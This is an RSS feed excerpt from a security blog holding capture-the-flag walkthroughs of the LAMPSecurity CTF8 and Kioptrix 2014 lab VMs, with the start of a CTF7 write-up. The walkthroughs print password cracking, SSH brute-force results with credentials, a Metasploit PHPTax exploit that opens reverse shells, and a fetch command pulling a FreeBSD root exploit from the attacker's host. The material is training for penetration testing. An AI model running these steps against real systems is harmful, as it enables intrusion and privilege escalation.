&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# hashcat &lt;span class=&quot;nt&quot;&gt;--username&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 ctf8-hashes.txt
/usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;hydra-ssh-brute-force&quot;&gt;Hydra SSH Brute Force&lt;/h2&gt;

&lt;p&gt;Hyrda was used to brute force SSH using the previously cracked password hashes:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking service ssh on port 22

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22][ssh] host: 192.168.221.135   login: jharraway   password: letmein!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22][ssh] host: 192.168.221.135   login: spinkton   password: football123
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22][ssh] host: 192.168.221.135   login: bdio   password: passw0rd
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 167.00 tries/min, 167 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:01h, 53 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:01h, 5 active&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;ssh-account-compromise&quot;&gt;SSH Account Compromise&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# ssh spinkton@192.168.221.135

Welcome to LAMPSecurity Research SSH access!

&lt;span class=&quot;c&quot;&gt;#flag#5e937c51b852e1ee90d42ddb5ccb8997&lt;/span&gt;

Unauthorized access is expected...

spinkton@192.168.221.135&lt;span class=&quot;s1&quot;&gt;'s password:
Last login: Thu Mar 27 12:48:29 2014 from 192.168.56.1
#flag#motd-flag&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;spinkton@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;

Password:

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;id

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;disk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,10&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user_u:system_r:unconfined_t&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Kioptrix Level 2014 Walkthrough</title>
          <link>https://highon.coffee/blog/kioptrix-level-2014-walkthrough/</link>
          <pubDate>Tue, 15 Apr 2014 14:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Kioptrix</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/kioptrix-level-2014-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-interrogation&quot; id=&quot;markdown-toc-web-application-interrogation&quot;&gt;Web Application Interrogation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#non-privileged-shell&quot; id=&quot;markdown-toc-non-privileged-shell&quot;&gt;Non Privileged Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.&lt;/p&gt;

&lt;h2 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h2&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 8080&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;        

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;web-application-interrogation&quot;&gt;Web Application Interrogation&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;http://192.168.221.159:8080/&lt;/code&gt; rendered a page 403 forbidden page. The Firefox UserAgent switcher was leveraged to change the browser to IE 6, exposing the web application &lt;strong&gt;PHPTAX&lt;/strong&gt; (this took a while to figure out!):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/kioptrix/phptax.png&quot; alt=&quot;phptax&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/kioptrix/phptax2.png&quot; alt=&quot;phptax2&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;non-privileged-shell&quot;&gt;Non Privileged Shell&lt;/h2&gt;

&lt;p&gt;Research discovered a metasploit module existed for phptax:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/http/phptax_exec
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;phptax_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 192.168.221.159
RHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 192.168.221.159
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;phptax_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RPORT 8080
RPORT &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 8080
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;phptax_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;TARGETURI /phptax/
TARGETURI &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /phptax/
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;phptax_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/multi/http/phptax_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name       Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   Proxies                     no        A proxy chain of format &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:host:port[,type:host:port][...]
   RHOST      192.168.221.159  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address
   RPORT      8080             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port
   TARGETURI  /phptax/         &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   PhpTax 0.8


msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;phptax_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:41] Started reverse double handler
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:41] 192.168.221.1598080 - Sending request...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Accepted the first client connection...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Accepted the second client connection...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Accepted the first client connection...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Accepted the second client connection...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Command: &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;GiSakqCyBJv7ZAuW&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Writing to socket A
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Writing to socket B
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Reading from sockets...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Command: &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;4yauS5V9QPhhcobv&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Writing to socket A
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Writing to socket B
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:42] Reading from sockets...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:43] Reading from socket B
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:43] B: &lt;span class=&quot;s2&quot;&gt;&quot;GiSakqCyBJv7ZAuW&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:43] Matching...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:43] A is input...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:43] Reading from socket B
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:43] B: &lt;span class=&quot;s2&quot;&gt;&quot;4yauS5V9QPhhcobv&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:43] Matching...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2016.01.07-08:20:43] A is input...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command shell session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.221.162:4444 -&amp;gt; 192.168.221.159:45072&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2016-01-07 08:20:43 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command shell session 2 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.221.162:4444 -&amp;gt; 192.168.221.159:62420&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2016-01-07 08:20:43 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h2&gt;

&lt;p&gt;The binary &lt;code&gt;fetch&lt;/code&gt; was used to download a FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit, fetch was used as the target didn’t contain the usual binaries for file download (wget, curl, etc).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wget
wget: not found

curl
curl: not found

fetch &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; exploit http://192.168.221.162:45/26368
exploit                                               2215  B   32 MBps

&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;exploit exploit.c
gcc exploit.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; exploit
./exploit

&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
sh: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
# cd /root
# ls
.cshrc
.history
.k5login
.login
.mysql_history
.profile
congrats.txt
folderMonitor.log
httpd-access.log
lazyClearLog.sh
monitor.py
ossec-alerts.log
# cat congrats.txt
If you are reading this, it means you got root (or cheated).
Congratulations either way...

Hope you enjoyed this new VM of mine. As always, they are made for the beginner in
mind, and not meant for the seasoned pentester. However this does not mean one
can'&lt;/span&gt;t enjoy them.

As with all my VMs, besides getting &lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt; on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;my mind,
are information gathering &amp;amp; research. Anyone can throw massive amounts of exploits
and &lt;span class=&quot;s2&quot;&gt;&quot;hope&quot;&lt;/span&gt; it works, but think about the traffic.. the logs... Best to take it
slow, and &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;up on the information you gathered and hopefully craft better
more targetted attacks.

For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won&lt;span class=&quot;s1&quot;&gt;'t from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren'&lt;/span&gt;t &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/log/apache/access.log&quot;&lt;/span&gt;, but &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/log/httpd-access.log&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
It&lt;span class=&quot;s1&quot;&gt;'s default document root is not &quot;/var/www/&quot; but in &quot;/usr/local/www/apache22/data&quot;.
Finding and knowing these little details will greatly help during an attack. Of course
my examples are specific for this target, but the theory applies to all systems.

As a small exercise, look at the logs and see how much noise you generated. Of course
the log results may not be accurate if you created a snapshot and reverted, but at least
it will give you an idea. For fun, I installed &quot;OSSEC-HIDS&quot; and monitored a few things.
Default settings, nothing fancy but it should'&lt;/span&gt;ve logged a few of your attacks. Look
at the following files:
/root/folderMonitor.log
/root/httpd-access.log &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;softlink&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/root/ossec-alerts.log &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;softlink&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
files &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2 specific folders. Since FreeBSD doesn&lt;span class=&quot;s1&quot;&gt;'t support &quot;iNotify&quot;, I couldn'&lt;/span&gt;t use OSSEC-HIDS
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this.
The httpd-access.log is rather self-explanatory &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
files. This one should&lt;span class=&quot;s1&quot;&gt;'ve detected a few of your web attacks.

Feel free to explore the system and other log files to see how noisy, or silent, you were.
And again, thank you for taking the time to download and play.
Sincerely hope you enjoyed yourself.

Be good...


loneferret
http://www.kioptrix.com


p.s.: Keep in mind, for each &quot;web attack&quot; detected by OSSEC-HIDS, by
default it would'&lt;/span&gt;ve blocked your IP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;both &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;hosts.allow &amp;amp; Firewall&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for
&lt;/span&gt;600 seconds. I was &lt;span class=&quot;nb&quot;&gt;nice &lt;/span&gt;enough to remove that part :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>LAMP Security CTF7 - Walkthrough</title>
          <link>https://highon.coffee/blog/lamp-security-ctf7-walkthrough/</link>
          <pubDate>Wed, 02 Apr 2014 20:00:30 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/lamp-security-ctf7-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#host-service-enumeration&quot; id=&quot;markdown-toc-host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-enumeration&quot; id=&quot;markdown-toc-web-application-enumeration&quot;&gt;Web Application Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-on-port-8080&quot; id=&quot;markdown-toc-web-application-on-port-8080&quot;&gt;Web Application on Port 8080&lt;/a&gt;    &lt;ul&gt;
